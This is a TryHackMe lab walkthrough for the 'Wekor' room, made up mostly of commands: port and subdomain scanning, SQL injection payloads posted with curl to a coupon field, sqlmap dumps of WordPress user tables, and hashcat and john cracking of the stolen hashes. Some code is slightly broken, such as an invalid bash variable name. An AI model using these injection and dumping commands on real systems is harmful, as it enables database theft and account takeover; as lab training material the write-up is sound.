## TryHackMe Walkthrough - Wekor
Added wekor.thm to /etc/hosts

URL=wekor.thm
### How to scan ports with nmap
```bash
IP_ADDR=
nmap -sV -sC -oA initial $IP_ADDR
```
### How to enumerate web server domains
```bash
DNSLISTS=/usr/share/amass/wordlists/subdomains-top1mil-5000.txt
wfuzz -c -w $DNSLISTS -t30 --hw 3 -H "Host:FUZZ.${URL}" "http://${URL}"
```
### How to enumerate web server path/folder/directory
```bash
WORDLISTS=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -e -u http://site.${URL} -xphp,txt -t30 -w ${WORDLISTS}
```
### How to enumerate with wpscan
```bash
wpscan.api=$(cat ~/Downloads/wpscan.api)
wpscan --url http://site.${URL}/wordpress/ -e ap,u --api-token ${wpscan.api}
```
### How to bruteforce sql with sqlmap
Test if vulnerable to sqli
```bash
' or 1 = 1 -- -
```
Pull 
```bash
' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -
```
```bash
curl -X POST http://${URL}/it-next/it_cart.php \
  -d "coupon_code=' OR 1=1 -- -" \
  -d "apply_coupon=Apply Coupon" | grep -i code

curl -X POST http://${URL}/it-next/it_cart.php \
  -d "coupon_code=' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -" \ -d "apply_coupon=Apply Coupon" | grep -i code
```
Use SQLMAP to determine if the database can be pull
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
```
Use SQLMAP to explore databases and tables
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --schema
```
Use SQLMAP to pull specific database and table
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
```
### How to crack the hash with hashcat
This is after you pull the users from the wordpress database and extract the hash password into a text file
```bash
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
## Resource
https://erichogue.ca/2021/06/Wekor

https://github.com/kartikeyj96/Tryhackme-Writeups/blob/main/Wekor%20Writeup
```
